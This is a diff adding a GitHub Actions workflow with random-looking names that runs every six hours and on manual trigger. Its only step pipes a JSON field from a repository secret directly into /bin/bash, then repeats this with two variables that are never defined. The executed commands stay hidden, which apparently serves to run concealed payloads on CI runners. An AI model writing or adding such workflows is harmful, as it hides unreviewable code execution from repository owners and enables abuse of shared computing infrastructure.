@@ -1,0 +1,20 @@
+name: wulouyu4716
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wulouyu4716
+        env:
+          uxp8: ${{ secrets.uxp8 }}
+        run: |
+          echo $uxp8 | jq -r .zvoks2 | /bin/bash
+          echo $u790 | jq -r .lksa1736 | /bin/bash
+          echo $kru7283 | jq -r .f0788 | /bin/bash
+
